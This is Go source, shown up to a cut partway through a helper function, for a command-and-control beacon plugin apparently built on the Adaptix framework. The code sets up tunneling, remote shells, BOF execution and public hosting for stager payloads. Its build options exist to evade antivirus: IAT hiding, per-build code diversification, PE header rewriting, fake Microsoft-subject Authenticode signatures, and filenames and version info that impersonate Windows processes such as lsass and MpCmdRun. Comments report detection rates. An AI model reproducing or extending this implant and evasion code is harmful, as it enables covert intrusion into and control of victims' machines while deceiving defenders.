package main

import (
	crand "crypto/rand"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"math/rand/v2"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	adaptix "github.com/Adaptix-Framework/axc2"
)

type Teamserver interface {
	TsListenerInteralHandler(watermark string, data []byte) (string, error)

	TsAgentProcessData(agentId string, bodyData []byte) error

	TsAgentUpdateData(newAgentData adaptix.AgentData) error
	TsAgentTerminate(agentId string, terminateTaskId string) error
	TsAgentUpdateDataPartial(agentId string, updateData interface{}) error

	TsAgentBuildExecute(builderId string, workingDir string, program string, args ...string) error
	TsAgentBuildLog(builderId string, status int, message string) error

	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)

	TsPivotCreate(pivotId string, pAgentId string, chAgentId string, pivotName string, isRestore bool) error
	TsGetPivotInfoByName(pivotName string) (string, string, string)
	TsGetPivotInfoById(pivotId string) (string, string, string)
	TsPivotDelete(pivotId string) error

	TsTaskCreate(agentId string, cmdline string, client string, taskData adaptix.TaskData)
	TsTaskUpdate(agentId string, data adaptix.TaskData)
	TsTaskGetAvailableAll(agentId string, availableSize int) ([]adaptix.TaskData, error)

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int64) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSave(agentId string, fileId string, filename string, content []byte) error

	TsScreenshotAdd(agentId string, Note string, Content []byte) error

	TsClientGuiDisksWindows(taskData adaptix.TaskData, drives []adaptix.ListingDrivesDataWin)
	TsClientGuiFilesStatus(taskData adaptix.TaskData)
	TsClientGuiFilesWindows(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataWin)
	TsClientGuiFilesUnix(taskData adaptix.TaskData, path string, files []adaptix.ListingFileDataUnix)
	TsClientGuiProcessWindows(taskData adaptix.TaskData, process []adaptix.ListingProcessDataWin)
	TsClientGuiProcessUnix(taskData adaptix.TaskData, process []adaptix.ListingProcessDataUnix)

	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelCreateSocks4(AgentId string, Info string, Lhost string, Lport int) (string, error)
	TsTunnelCreateSocks5(AgentId string, Info string, Lhost string, Lport int, UseAuth bool, Username string, Password string) (string, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelCreateRportfwd(AgentId string, Info string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelUpdateRportfwd(tunnelId int, result bool) (string, string, error)

	TsTunnelStopSocks(AgentId string, Port int)
	TsTunnelStopLportfwd(AgentId string, Port int)
	TsTunnelStopRportfwd(AgentId string, Port int)

	TsTunnelConnectionClose(channelId int, writeOnly bool)
	TsTunnelConnectionHalt(channelId int, errorCode byte)
	TsTunnelConnectionResume(AgentId string, channelId int, ioDirect bool)
	TsTunnelConnectionData(channelId int, data []byte)
	TsTunnelConnectionAccept(tunnelId int, channelId int)
	TsTunnelPause(channelId int)
	TsTunnelResume(channelId int)

	TsTerminalConnExists(terminalId string) bool
	TsTerminalGetPipe(AgentId string, terminalId string) (*io.PipeReader, *io.PipeWriter, error)
	TsTerminalConnResume(agentId string, terminalId string, ioDirect bool)
	TsTerminalConnData(terminalId string, data []byte)
	TsTerminalConnClose(terminalId string, status string) error

	TsConvertCpToUTF8(input string, codePage int) string
	TsConvertUTF8toCp(input string, codePage int) string
	TsWin32Error(errorCode uint) string

	// Public HTTP endpoints (used by productized Stager payload hosting)
	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
	TsEndpointUnregisterPublic(method string, path string) error
	TsEndpointExistsPublic(method string, path string) bool
}

type PluginAgent struct{}

type ExtenderAgent struct{}

var (
	Ts             Teamserver
	ModuleDir      string
	AgentWatermark string
)

func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
	ModuleDir = moduleDir
	AgentWatermark = watermark
	Ts = ts.(Teamserver)
	// Register public /s/:token once at load time (before HTTP Start). Required for productized Stager.
	if err := stagerInitRoutes(); err != nil {
		fmt.Printf("[beacon_agent] stager route init failed: %v\n", err)
	} else {
		fmt.Printf("[beacon_agent] stager payload route ready: GET /s/:token\n")
	}
	return &PluginAgent{}
}

func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
	return &ExtenderAgent{}
}

func inferBeaconProtocol(listenerMap map[string]any) string {
	protocol, _ := listenerMap["protocol"].(string)
	if protocol != "" {
		return protocol
	}
	if _, hasHbHeader := listenerMap["hb_header"]; hasHbHeader {
		if _, hasUri := listenerMap["uri"]; hasUri {
			return "ws"
		}
	}
	if _, hasUri := listenerMap["uri"]; hasUri {
		return "http"
	}
	if _, hasPipe := listenerMap["pipename"]; hasPipe {
		return "bind_smb"
	}
	if _, hasTcpBanner := listenerMap["tcp_banner"]; hasTcpBanner {
		return "bind_tcp"
	}
	if _, hasDns := listenerMap["dns_domain"]; hasDns {
		return "dns"
	}
	return ""
}

func makeProxyTask(packData []byte) adaptix.TaskData {
	return adaptix.TaskData{Type: adaptix.TASK_TYPE_PROXY_DATA, Data: packData, Sync: false}
}

// maxBofObjectBytes 是单个 BOF 对象的上限，一条**读文件前**的守卫：
// 实参可能是敲错的路径（"/var/log/syslog"），没有上限就会把整个文件读进内存
// 再塞进任务包 —— 服务端 1.9G，这类手误不该有放大器。
const maxBofObjectBytes = 16 << 20 // 16 MiB

// resolveBofObject 把 `execute bof` 的实参解析成对象字节。
//
// ★ 为什么必须先试路径：本命令在命令树里的示例一直是
//   `execute bof /home/user/whoami.o`（ax_config.axs），WebUI 的补全也按
//   服务端绝对路径给候选，而这里原本**只认 base64** —— 操作员从候选里选一个，
//   得到 `illegal base64 data at input byte 4`，完全看不出「其实要贴 base64」。
//   linux_agent 早已是「先路径、后 base64」，这里补齐，四个 extender 行为一致。
//
// ★ 路径按**进程 cwd** 解析（服务端 cwd = <dist>，如 /home/ad/dist），
//   所以补全给的是绝对路径；相对路径能用只是巧合，不要依赖。
func resolveBofObject(v string) ([]byte, error) {
	if v == "" {
		return nil, errors.New("bof object is empty")
	}

	if st, statErr := os.Stat(v); statErr == nil && !st.IsDir() {
		if st.Size() > maxBofObjectBytes {
			return nil, fmt.Errorf("bof object %s is too large (%d bytes, max %d)", v, st.Size(), maxBofObjectBytes)
		}
		b, readErr := os.ReadFile(v)
		if readErr != nil {
			return nil, fmt.Errorf("cannot read bof object %s: %v", v, readErr)
		}
		if len(b) == 0 {
			return nil, fmt.Errorf("bof object %s is empty", v)
		}
		return b, nil
	}

	b, err := base64.StdEncoding.DecodeString(v)
	if err != nil {
		return nil, fmt.Errorf("bof object %q is neither a readable file on the teamserver nor valid base64 data", v)
	}
	if len(b) == 0 {
		return nil, fmt.Errorf("bof object %q decoded to 0 bytes", v)
	}
	return b, nil
}

func getStringArg(args map[string]any, key string) (string, error) {
	v, ok := args[key].(string)
	if !ok {
		return "", fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getFloatArg(args map[string]any, key string) (float64, error) {
	v, ok := args[key].(float64)
	if !ok {
		return 0, fmt.Errorf("parameter '%s' must be set", key)
	}
	return v, nil
}

func getBoolArg(args map[string]any, key string) bool {
	v, _ := args[key].(bool)
	return v
}

/// TUNNEL

func (ext *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
	return adaptix.TunnelCallbacks{
		ConnectTCP: TunnelMessageConnectTCP,
		ConnectUDP: TunnelMessageConnectUDP,
		WriteTCP:   TunnelMessageWriteTCP,
		WriteUDP:   TunnelMessageWriteUDP,
		Pause:      TunnelMessagePause,
		Resume:     TunnelMessageResume,
		Close:      TunnelMessageClose,
		Reverse:    TunnelMessageReverse,
	}
}

func TunnelMessageConnectTCP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, tunnelType, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageConnectUDP(channelId int, tunnelType int, addressType int, address string, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteTCP(channelId int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageWriteUDP(channelId int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessagePause(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_PAUSE, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageResume(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_RESUME, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageClose(channelId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

/// TERMINAL

func (ext *ExtenderAgent) TerminalCallbacks() adaptix.TerminalCallbacks {
	return adaptix.TerminalCallbacks{
		Start: TerminalMessageStart,
		Write: TerminalMessageWrite,
		Close: TerminalMessageClose,
	}
}

func TerminalMessageStart(terminalId int, program string, sizeH int, sizeW int, oemCP int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	programArgs := Ts.TsConvertUTF8toCp(program, oemCP)
	array := []interface{}{COMMAND_SHELL_START, terminalId, programArgs}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageWrite(terminalId int, oemCP int, data []byte) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	dataEncode := Ts.TsConvertUTF8toCp(string(data), oemCP)
	if oemCP > 0 {
		dataEncode = strings.ReplaceAll(dataEncode, "\n", "\r\n")
	}
	array := []interface{}{COMMAND_SHELL_WRITE, terminalId, len(dataEncode), []byte(dataEncode)}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

func TerminalMessageClose(terminalId int) adaptix.TaskData {
	var packData []byte
	/// START CODE HERE
	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
	packData, _ = PackArray(array)
	/// END CODE HERE
	return makeProxyTask(packData)
}

////// PLUGIN AGENT

type GenerateConfig struct {
	Os            string `json:"os" ax:"label=系统;group=基础;extra=windows;hint=beacon 只有 Windows 版；这个键固定是 windows"`
	Arch          string `json:"arch" ax:"label=架构;group=基础;extra=x64;hint=x86 是 pl_main.go:910 起的特例分支，x64 是隐含的 else;optorder=x64"`
	Format        string `json:"format" ax:"label=输出格式;group=基础;hint=Stager 需在下面「Stager 下载端点」组填地址与端口;optorder=Exe,Service Exe,DLL,Shellcode,Hex C,Stager"`
	Sleep         string `json:"sleep" ax:"label=Sleep;group=基础;hint=支持 h/m/s；beacon 的解析器（pl_utils.go:414）不补单位，裸数字会被当成 0"`
	Jitter        int    `json:"jitter" ax:"label=Jitter %;group=基础;range=0-100"`
	SvcName       string `json:"svcname" ax:"label=服务名;group=进程与签名;showif=format:Service Exe;hint=Service Exe 必填：pl_main.go:975 只是逐字符转义后串进 -DSERVICE_NAME，空值不报错，会生成一个装不上的服务"`
	IsKillDate    bool   `json:"is_killdate" ax:"label=启用 killdate;group=信标窗口"`
	Killdate      string `json:"kill_date" ax:"label=killdate 日期;group=信标窗口;hint=GMT 时间"`
	Killtime      string `json:"kill_time" ax:"label=killdate 时间;group=信标窗口"`
	IsWorkingTime bool   `json:"is_workingtime" ax:"label=启用 workingtime;group=信标窗口"`
	StartTime     string `json:"start_time" ax:"label=工作起始;group=信标窗口;hint=每周一跳的窗口，靠 killdate/workingtime 命令可远程改"`
	EndTime       string `json:"end_time" ax:"label=工作结束;group=信标窗口"`
	// nil / omitted in JSON → default true (no CRT: -nostdlib + IAT path). Explicit false uses MinGW CRT.
	IatHiding          *bool  `json:"iat_hiding" ax:"label=IAT Hiding（无 CRT、空导入表）;group=进程与签名;hint=插件默认值来自 buildenv.mk 的 BEACON_IAT_HIDING_DEFAULT（见 pl_main.go:400）；开启后被 360 QVM 2.0 判为 HEUR/QVM.9B7A"`
	IsSideloading      bool   `json:"is_sideloading" ax:"label=Legit-DLL 侧载;group=图标与侧载;showif=format:DLL;order=-3"`
	SideloadingContent string `json:"sideloading_content" ax:"label=合法 DLL 文件;group=图标与侧载;file=.dll;showif=format:DLL;hint=作为导出表来源；勾了侧载但留空会构建失败;order=-2"`
	IconContent        string `json:"icon_content" ax:"label=ICO 文件;group=图标与侧载;file=.ico;showif=format:Exe,Service Exe,DLL;hint=留空 = 用默认图标；与「随机 ICO」同时勾选时以随机为准"`
	IconRandom         bool   `json:"icon_random" ax:"label=随机生成 ICO;group=图标与侧载;showif=format:Exe,Service Exe,DLL;order=-1"`
	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_PSEUDO_SIGN（当前 := true）；
	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectiveExePseudoSign()。
	ExePseudoSign *bool `json:"exe_pseudo_sign" ax:"label=Exe 伪 Authenticode 签名;group=进程与签名;showif=format:Exe,Service Exe;hint=★ 默认关（buildenv.mk 的 BEACON_PSEUDO_SIGN=false）：实测自签名会把产物推进查杀（开 0/12 过 vs 关 7/9 过），换中性证书主体也救不了；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败"`
	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD（当前 := true）；
	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectivePeHeaderMod()。
	PeHeaderMod *bool `json:"pe_header_mod" ax:"label=PE Header 改写（Rich header）;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header，做 per-build 多样化"`
	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_DIVERSIFY（当前 := true）；
	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectiveDiversify()。
	// ★ 以前这个开关只存在于 buildenv.mk，操作员在生成时无法关掉 —— 而它正是
	//   "本次产物和上一次长得像不像" 的唯一旋钮，出问题时要能单独摘出来做对照。
	Diversify *bool `json:"diversify" ax:"label=per-build 多样化（junk + decoy 导入）;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_DIVERSIFY=true；让每次生成的 .text/.idata 不同，避免云模型收敛到单一模式"`
	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_DISGUISE（当前 := true）。
	// true = 冒充微软自家组件；false = 中性身份（虚构厂商 Northwind + 通用进程名）。
	// 三种取值语义见 effectiveDisguise()。
	Disguise *bool `json:"disguise" ax:"label=伪装成微软组件;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_DISGUISE=true；开启后文件名/版本信息都伪装成微软自家程序（smartscreen / MpCmdRun …），关闭则用中性身份（不冒充真实厂商）"`
	DnsResolvers       string `json:"dns_resolvers" ax:"label=DNS 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用监听器上的 resolvers（pl_utils.go:483）"`
	DohResolvers       string `json:"doh_resolvers" ax:"label=DoH 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用插件内置默认（pl_utils.go:488）"`
	DnsMode            string `json:"dns_mode" ax:"label=DNS 模式;group=DNS;showif=listener:BeaconDNS;order=-1"`
	UserAgent          string `json:"user_agent" ax:"label=User-Agent;group=DNS;showif=listener:BeaconDNS;hint=留空用插件内置默认（pl_main.go:819）"`
	UseProxy           bool   `json:"use_proxy" ax:"label=使用 HTTP/HTTPS 代理;group=代理与轮换;showif=listener:BeaconHTTP,BeaconWS"`
	ProxyType          string `json:"proxy_type" ax:"label=代理类型;group=代理与轮换;extra=http;showif=listener:BeaconHTTP,BeaconWS;hint=https 是 pl_main.go:786 的特例，http 是隐含的 else;optorder=http"`
	ProxyHost          string `json:"proxy_host" ax:"label=代理地址;group=代理与轮换;showif=listener:BeaconHTTP,BeaconWS"`
	ProxyPort          int    `json:"proxy_port" ax:"label=代理端口;group=代理与轮换;range=0-65535;showif=listener:BeaconHTTP,BeaconWS;hint=开启代理时必填 —— 插件不做兜底，空值就是 0"`
	ProxyUsername      string `json:"proxy_username" ax:"label=代理用户名;group=代理与轮换;showif=listener:BeaconHTTP,BeaconWS;hint=可留空"`
	ProxyPassword      string `json:"proxy_password" ax:"label=代理口令;group=代理与轮换;showif=listener:BeaconHTTP,BeaconWS;hint=可留空"`
	RotationMode       string `json:"rotation_mode" ax:"label=轮换模式;group=代理与轮换;extra=sequential;showif=listener:BeaconHTTP,BeaconWS;hint=多个 callback 地址时的取用顺序；random 是 pl_main.go:756 的特例"`

	// --- Stager 下载端点的来源（仅 Stager / Service Stager 格式用到）---
	//
	// 产品化 Stager 把载荷挂在**团队服务器自己的 HTTP endpoint** 的 /s/:token 上，
	// 所以生成时必须知道那个 endpoint 在哪：端口、协议、对外地址。
	//
	// 这三项**必须由控制台表单提供**（主路径）—— 约定是所有操作员都在 WebUI 上
	// 操作，而进程环境变量只有起服务那一步能注入，操作员在控制台里改不了。
	// 环境变量（ADAPTIX_TEAMSERVER_HOST/PORT/SSL，由 build_deploy.sh --up 注入）
	// 只作为回退保留。两者都缺时生成**硬报错**，绝不静默回落 8080 ——
	// 那在标准 profile 里是 agent 监听器，stager 会对一个明文端口讲 TLS，
	// 死在目标机上且服务端一点痕迹都不留。
	StagerTSHost string `json:"stager_ts_host" ax:"label=Teamserver 地址;group=Stager 下载端点;showif=format:Stager;hint=内层载荷挂在 teamserver 自己的 /api/s/<token> 上，不是监听器端口；控制台默认填当前页面的地址"`
	StagerTSPort int    `json:"stager_ts_port" ax:"label=端口;group=Stager 下载端点;range=0-65535;showif=format:Stager"`
	// 指针：区分「没填」与「明确填 false（明文端点）」。nil ⇒ 交由回退决定。
	StagerTSSSL *bool `json:"stager_ts_ssl" ax:"label=走 TLS（与 Teamserver.ssl 一致）;group=Stager 下载端点;showif=format:Stager"`
}

func (c GenerateConfig) effectiveIatHiding() bool {
	// Default from buildenv.mk (BEACON_IAT_HIDING_DEFAULT): iat_hiding (no CRT
	// + empty IAT + PEB-hash API resolution) is flagged by 360 QVM 2.0 as
	// HEUR/QVM.9B7A; the normal-CRT path (iat_hiding=false, rich static IAT)
	// passes QVM. Opt in explicitly only when runtime IAT stealth matters more
	// than static AV evasion.
	if c.IatHiding == nil {
		return buildEnv["BEACON_IAT_HIDING_DEFAULT"] == "true"
	}
	return *c.IatHiding
}

// effectivePeHeaderMod 决出这次构建要不要跑 pe_header_mod.py（L4 PE 头改写：
// Rich header 注入 + 校验和 + 时间戳随机化，做 per-build 多样化）。
//
// ★ 在补上它之前，ax_config.axs 的 GenerateUI（:653 container.put("pe_header_mod", …)）
//   和 Web 的 BuildSchema 都在往 config 里填这个键，而这里**没有任何地方读它** ——
//   控制台的勾选框是惰性的，永远只看 buildenv.mk。与 ExePseudoSign 是同一个坑。
func (c GenerateConfig) effectivePeHeaderMod() bool {
	if c.PeHeaderMod == nil {
		return buildEnv["BEACON_PE_HEADER_MOD"] == "true"
	}
	return *c.PeHeaderMod
}

// effectiveExePseudoSign 决出这次构建要不要跑伪签名。
//
// ★ 这个字段原先是**值类型 bool**，于是"省略这个键"= 零值 false = 不签名 ——
//   而 buildenv.mk 的 BEACON_PSEUDO_SIGN（:= true）、ax_config.axs 的
//   checkExePseudoSign.setChecked(true)、Generate.tsx 的 defaultAgentConfig 全都写着
//   默认开。三方说开、实现说关，只有**经过 UI** 的调用能签上名；任何脚本/API 调用
//   只要不带这个键，出来的就是一个"自称 Microsoft 却没有签名"的产物 ——
//   比不伪装更可疑（正常 Windows 二进制不会既是 Microsoft 的又没有签名）。
//   改成 *bool 后与 IatHiding / PeHeaderMod 同口径：省略 = 跟随 buildenv。
func (c GenerateConfig) effectiveExePseudoSign() bool {
	if c.ExePseudoSign == nil {
		return buildEnv["BEACON_PSEUDO_SIGN"] == "true"
	}
	return *c.ExePseudoSign
}

// effectiveDiversify 决出这次构建要不要跑 L2 per-build 多样化（junk 函数 + decoy 导入）。
// 与上面两个同口径：nil ⇒ 跟随 buildenv.mk 的 BEACON_DIVERSIFY。
func (c GenerateConfig) effectiveDiversify() bool {
	if c.Diversify == nil {
		return buildEnv["BEACON_DIVERSIFY"] == "true"
	}
	return *c.Diversify
}

// effectiveDisguise 决出这次构建用哪套身份（文件名 + 版本信息 + 签名主体同源）。
// 与上面几个同口径：nil ⇒ 跟随 buildenv.mk 的 BEACON_DISGUISE。
func (c GenerateConfig) effectiveDisguise() bool {
	if c.Disguise == nil {
		return buildEnv["BEACON_DISGUISE"] == "true"
	}
	return *c.Disguise
}

// peFormat 只对有 PE 头的产物成立（Shellcode / Hex C 没有头可改）。
func (c GenerateConfig) peFormat() bool {
	return c.Format == "Exe" || c.Format == "Service Exe" || c.Format == "DLL"
}

// resolveLinkerLd locates the GNU ld script for IAT-hidden Exe/Service links.
// Supports: developer tree (…/src_beacon/beacon/Linker.ld) and packaged dist (…/beacon/Linker.ld or …/Linker.ld).
func resolveLinkerLd(moduleDir string) (string, error) {
	candidates := []string{
		filepath.Join(moduleDir, "src_beacon", "beacon", "Linker.ld"),
		filepath.Join(moduleDir, "beacon", "Linker.ld"),
		filepath.Join(moduleDir, "Linker.ld"),
	}
	for _, p := range candidates {
		abs, err := filepath.Abs(p)
		if err != nil {
			continue
		}
		st, err := os.Stat(abs)
		if err == nil && !st.IsDir() {
			return abs, nil
		}
	}
	return "", fmt.Errorf("Linker.ld not found under %q (need src_beacon/beacon/, beacon/, or top-level Linker.ld next to agent_beacon.so)", moduleDir)
}

func resolveShellcodeBin(moduleDir string, protocol string, binName string) (string, error) {
	ObjectDir := ""
	if protocol == "http" {
		ObjectDir = ObjectDir_http
	} else if protocol == "bind_smb" {
		ObjectDir = ObjectDir_smb
	} else if protocol == "bind_tcp" {
		ObjectDir = ObjectDir_tcp
	} else if protocol == "dns" {
		ObjectDir = ObjectDir_dns
	} else if protocol == "ws" {
		ObjectDir = ObjectDir_ws
	}

	candidates := []string{
		filepath.Join(moduleDir, "src_beacon", ObjectDir, binName),
		filepath.Join(moduleDir, ObjectDir, binName),
	}
	for _, p := range candidates {
		abs, err := filepath.Abs(p)
		if err == nil {
			if st, err := os.Stat(abs); err == nil && !st.IsDir() {
				return abs, nil
			}
		}
	}
	return "", fmt.Errorf("shellcode bin %q for protocol %q not found in %q", binName, protocol, moduleDir)
}

// benignExe —— 生成产物"伪装成哪个正常 Windows 程序"的**唯一来源**。
//
// ★★ 文件名、版本信息、Authenticode 签名主体三处必须**同源**。
//    以前是三张互不相干的表：文件名从一个池里随机挑、版本信息从 viPool 挑、
//    签名 CN 又是 `App-%08X` 这种乱码。后果是同一个产物自己打自己：
//    文件叫 RuntimeBroker.exe、属性里 FileDescription 写着 "Notepad"、
//    数字签名发给 "CN=App-3F2A1B, O=Vendor-9C21D0" —— 右键看一下属性就露馅，
//    比不改还糟。
//
// ★ 选材：真实存在且**常见**的 Windows 可执行文件 / 服务名，描述与产品名照抄
//   微软自己的版本资源。名字刻意不带 agent / payload / loader / svc / x64
//   这类工具标记 —— 那是真实 Windows 进程名里绝不会出现的东西。
type benignExe struct {
	name    string // 不含扩展名；同时用作 OriginalFilename 与 InternalName
	desc    string // FileDescription
	product string // ProductName
}

var benignExePool = []benignExe{
	{"RuntimeBroker", "Runtime Broker", "Microsoft® Windows® Operating System"},
	{"WmiPrvSE", "WMI Provider Host", "Microsoft® Windows® Operating System"},
	{"taskhostw", "Host Process for Windows Tasks", "Microsoft® Windows® Operating System"},
	{"dllhost", "COM Surrogate", "Microsoft® Windows® Operating System"},
	{"conhost", "Console Window Host", "Microsoft® Windows® Operating System"},
	{"SearchIndexer", "Microsoft Windows Search Indexer", "Microsoft® Windows® Operating System"},
	{"SearchProtocolHost", "Microsoft Windows Search Protocol Host", "Microsoft® Windows® Operating System"},
	{"SearchFilterHost", "Microsoft Windows Search Filter Host", "Microsoft® Windows® Operating System"},
	{"backgroundTaskHost", "Background Task Host", "Microsoft® Windows® Operating System"},
	{"SettingSyncHost", "Host Process for Setting Synchronization", "Microsoft® Windows® Operating System"},
	{"TextInputHost", "Windows Input Experience", "Microsoft® Windows® Operating System"},
	{"StartMenuExperienceHost", "Start Menu Experience Host", "Microsoft® Windows® Operating System"},
	{"ShellExperienceHost", "Windows Shell Experience Host", "Microsoft® Windows® Operating System"},
	{"sihost", "Shell Infrastructure Host", "Microsoft® Windows® Operating System"},
	{"SecurityHealthService", "Windows Security Service", "Microsoft® Windows® Operating System"},
	{"SecurityHealthSystray", "Windows Security notification icon", "Microsoft® Windows® Operating System"},
	{"SgrmBroker", "System Guard Runtime Monitor Broker", "Microsoft® Windows® Operating System"},
	{"DeviceAssociationService", "Device Association Service", "Microsoft® Windows® Operating System"},
	{"audiodg", "Windows Audio Device Graph Isolation", "Microsoft® Windows® Operating System"},
	{"ctfmon", "CTF Loader", "Microsoft® Windows® Operating System"},
	{"spoolsv", "Spooler SubSystem App", "Microsoft® Windows® Operating System"},
	{"svchost", "Host Process for Windows Services", "Microsoft® Windows® Operating System"},
	{"fontdrvhost", "Usermode Font Driver Host", "Microsoft® Windows® Operating System"},
	{"WUDFHost", "Windows Driver Foundation - User-mode Driver Framework Host Process", "Microsoft® Windows® Operating System"},
	{"WmiApSrv", "WMI Performance Adapter", "Microsoft® Windows® Operating System"},
	{"smartscreen", "Windows Defender SmartScreen", "Microsoft® Windows® Operating System"},
	{"MpCmdRun", "Microsoft Malware Protection Command Line Utility", "Microsoft® Windows® Operating System"},
	{"Explorer", "Windows Explorer", "Microsoft® Windows® Operating System"},
	{"notepad", "Notepad", "Microsoft® Windows® Operating System"},
	{"taskmgr", "Task Manager", "Microsoft® Windows® Operating System"},
	{"cmd", "Windows Command Processor", "Microsoft® Windows® Operating System"},
	{"winlogon", "Windows Logon Application", "Microsoft® Windows® Operating System"},
	{"services", "Services and Controller app", "Microsoft® Windows® Operating System"},
	{"lsass", "Local Security Authority Process", "Microsoft® Windows® Operating System"},
	{"dwm", "Desktop Window Manager", "Microsoft® Windows® Operating System"},
	{"LogonUI", "Windows Logon User Interface Host", "Microsoft® Windows® Operating System"},
}

// neutralExePool 是**关掉伪装**（BEACON_DISGUISE=false）时的身份池。
//
// 和 benignExePool 的区别只有一个：**不冒充真实厂商**。
// 厂商是虚构的 Northwind（微软自家文档里的占位公司名），进程名/描述都是通用词，
// 不指向任何一个真实存在的 Windows 组件 —— 所以"文件自称 X"与"X 其实不是这样"
// 之间不存在可被抓住的矛盾。
//
// ★ 为什么要留这一档：benignExePool 造出来的产物是"自称微软 Defender 组件、
//   却由 MinGW 编译、且没有微软签名"。这三点放一起本身就是一条强特征。
//   把品牌摘掉后，产物退化成"一个没人认识的普通小程序"——
//   通常不如伪装好看，但**不需要用签名去圆谎**。
var neutralExePool = []benignExe{
	{"updater", "Software Updater", "Northwind Client Utilities"},
	{"helper", "Helper Service", "Northwind Client Utilities"},
	{"runner", "Background Runner", "Northwind Client Utilities"},
	{"monitor", "System Monitor", "Northwind Client Utilities"},
	{"notifier", "Notification Service", "Northwind Client Utilities"},
	{"tasksvc", "Task Service", "Northwind Client Utilities"},
	{"syncsvc", "Sync Service", "Northwind Client Utilities"},
	{"devhelper", "Device Helper", "Northwind Client Utilities"},
}

// neutralSignIssuer 是中性伪装下使用的厂商名。Northwind 是虚构的占位公司名，
// 不用真实厂商（那会把"冒充"从一个对象换成另一个对象，没有解决问题）。
const neutralSignIssuer = "Northwind Software Inc"

// microsoftSignSubject 是伪签名用的证书主体 —— 照抄微软自家 Authenticode 证书的
// 结构。★ 它只是**外观**：自签名的根不在任何信任链里，签名校验（signtool verify
// / 驱动加载 / 部分 EDR 的签名策略）依然判为不受信任。它的作用是让"右键 → 数字签名"
// 那一栏看起来和一份正常 Windows 程序一致，而不是 `CN=App-3F2A1B`。
func microsoftSignSubject() string {
	return "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=Microsoft Corporation/CN=Microsoft Windows"
}

// neutralSignSubject 是关掉伪装时的证书主体 —— 与 neutralExePool / identityCompany 同源，
// 仍是一份完整的 DN，只是主体是**虚构厂商**，不冒充任何真实公司。
func neutralSignSubject() string {
	return "/C=US/ST=California/L=San Jose/O=" + neutralSignIssuer + "/OU=Digital Operations/CN=" + neutralSignIssuer
}

func generateRandomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.IntN(len(letters))]
	}
